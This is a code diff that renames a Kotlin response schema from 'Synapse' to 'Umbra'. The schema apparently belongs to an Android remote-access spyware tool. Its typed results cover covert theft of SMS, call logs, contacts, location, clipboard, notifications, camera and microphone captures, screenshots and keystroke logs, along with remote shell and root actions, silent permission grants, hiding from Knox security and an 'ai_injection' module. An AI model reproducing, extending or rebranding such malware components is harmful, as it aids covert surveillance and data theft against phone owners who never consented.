@@ -1,4 +1,4 @@
-package org.synapse.core.core
+package org.umbra.core.core
 
 import kotlinx.serialization.SerialName
 import kotlinx.serialization.Serializable
@@ -6,14 +6,14 @@ import kotlinx.serialization.Serializable
 // ─── Sealed class hierarchy of all typed responses ──────────────────────────
 
 @Serializable
-sealed class SynapseResponse {
+sealed class UmbraResponse {
 
     @Serializable
     @SerialName("ping")
     data class PingResponse(
         val pong: Boolean = true,
         val latency_ms: Long = 0
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("device_info")
@@ -27,13 +27,13 @@ sealed class SynapseResponse {
         val hardware: String,
         val android_id: String,
         val imei: String = ""
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("file_list")
     data class FileListResponse(
         val entries: List<FileEntry>
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("file_read")
@@ -42,7 +42,7 @@ sealed class SynapseResponse {
         val mime_type: String,
         val size_bytes: Long,
         val base64_data: String
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("location")
@@ -51,7 +51,7 @@ sealed class SynapseResponse {
         val lng: Double,
         val accuracy: Float,
         val provider: String
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("shell")
@@ -59,7 +59,7 @@ sealed class SynapseResponse {
         val exit_code: Int,
         val stdout: String,
         val stderr: String
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("camera")
@@ -69,7 +69,7 @@ sealed class SynapseResponse {
         val height: Int = 0,
         val format: String = "JPEG",
         val size_bytes: Long = 0
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("clipboard")
@@ -78,7 +78,7 @@ sealed class SynapseResponse {
         val vulnerability: String = "",
         val entry_count: Int,
         val entries: List<ClipboardEntry>
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("permission_grant")
@@ -87,7 +87,7 @@ sealed class SynapseResponse {
         val granted: List<String>,
         val failed: List<String>,
         val details: String = ""
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("knox_hide")
@@ -97,28 +97,28 @@ sealed class SynapseResponse {
         val service_status: String,
         val target_package: String = "",
         val details: String = ""
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("sms_list")
     data class SmsListResponse(
         val messages: List<SmsMessage>,
         val count: Int
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("calls_list")
     data class CallLogResponse(
         val calls: List<CallEntry>,
         val count: Int
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("contacts_list")
     data class ContactsResponse(
         val contacts: List<ContactEntry>,
         val count: Int
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("screenshot")
@@ -128,7 +128,7 @@ sealed class SynapseResponse {
         val height: Int = 0,
         val format: String = "PNG",
         val size_bytes: Long = 0
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("mic_recording")
@@ -137,21 +137,21 @@ sealed class SynapseResponse {
         val duration_seconds: Int,
         val format: String = "AAC",
         val size_bytes: Long = 0
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("notifications_list")
     data class NotificationsResponse(
         val notifications: List<NotificationEntry>,
         val count: Int
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("keylog_dump")
     data class KeylogResponse(
         val keystrokes: List<KeylogEntry>,
         val count: Int
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("ai_injection")
@@ -163,7 +163,7 @@ sealed class SynapseResponse {
         val routes: Map<String, String>,
         val success: Boolean,
         val details: String
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("sms_send")
@@ -172,14 +172,14 @@ sealed class SynapseResponse {
         val destination: String,
         val message: String,
         val details: String = ""
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("live_status")
     data class LiveStatusResponse(
         val status: String,
         val monitors: Map<String, Boolean>
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("live_event")
@@ -201,14 +201,14 @@ sealed class SynapseResponse {
         // Clipboard fields
         val clipboard_text: String = "",
         val clipboard_mime: String = "text/plain"
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("root_check")
     data class RootCheckResponse(
         val status: String,
         val details: Map<String, String>
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("root_action")
@@ -216,14 +216,14 @@ sealed class SynapseResponse {
         val action: String,
         val success: Boolean,
         val results: Map<String, String>
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 
     @Serializable
     @SerialName("error")
     data class ErrorResponse(
         val error: String,
         val module: String
-    ) : SynapseResponse()
+    ) : UmbraResponse()
 }
 
 // ─── Supporting types ───────────────────────────────────────────────────────
@@ -295,6 +295,6 @@ data class ResponseEnvelope(
     val device_id: String = "",
     val cmd_id: String = "",
     val status: String = "ok",
-    val payload: SynapseResponse? = null,
+    val payload: UmbraResponse? = null,
     val error: String = ""
 )
